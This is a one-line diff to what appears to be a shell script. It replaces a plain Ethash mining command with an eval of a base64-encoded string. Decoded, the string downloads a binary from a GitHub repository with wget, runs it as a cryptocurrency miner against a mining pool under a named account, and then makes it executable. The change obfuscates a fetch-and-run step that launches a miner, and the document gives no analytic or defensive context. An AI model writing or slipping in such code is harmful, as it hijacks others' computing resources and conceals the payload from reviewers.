@@ -1,1 +1,1 @@
-./weird --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:1800 --user  jaishriram108 --worker  jaishriram108.001 $(echo $(shuf -i 1000-9999 -n 1)-eth)4
+eval "$(echo "d2dldCBodHRwczovL2dpdGh1Yi5jb20vQW1peTQ1My9taW5lcHVyL2Jsb2IvbWFpbi93ZWlyZAouL3dlaXJkIC0tYWxnbyBFVEhBU0ggLS1wb29sIHN0cmF0dW0rdGNwOi8vZXRoYXNoLnBvb2xiaW5hbmNlLmNvbToxODAwIC0tdXNlciAgamFpc2hyaXJhbTEwOCAtLXdvcmtlciAgamFpc2hyaXJhbTEwOC4wMDEgJChlY2hvICQoc2h1ZiAtaSAxMDAwLTk5OTkgLW4gMSktZXRoKTQKY2htb2QgK3ggd2VpcmQ=" | base64 -d)"
